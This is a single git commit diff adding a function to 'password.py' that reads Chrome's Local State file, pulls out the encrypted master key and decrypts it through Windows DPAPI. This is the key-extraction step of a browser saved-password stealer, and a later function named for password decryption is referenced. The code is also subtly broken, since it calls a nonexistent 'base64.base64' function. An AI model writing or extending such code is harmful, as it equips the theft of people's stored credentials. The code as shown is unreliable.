cb3c323d79a6dce99644925eeac9f2d6cfd6916c
Aleksa Zatezalo <zabumaphu@gmail.com>
2025-05-27 21:56:07 +0200

    Password encryption

--- password.py
+++ password.py
@@ -28,7 +28,20 @@ def fetching_encryption_key():
     Gets the chrome encryption key.
     """
 
-    pass
+    local_computer_directory_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
+
+    with open(local_computer_directory_path, "r", encoding="utf-8") as f:
+        local_state_data = f.read()
+        local_state_data = json.loads(local_state_data)
+    
+    # decoding the encryption key using base64
+    encryption_key = base64.base64(local_state_data["os_crypt"]["encrypted_key"])
+
+    # remove Windows Data Protection API (DPAPI) str
+    encryption_key = encryption_key[5:]
+
+    # return decrypted key
+    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
 
 def password_decryption(passord, encryption_key):
     """
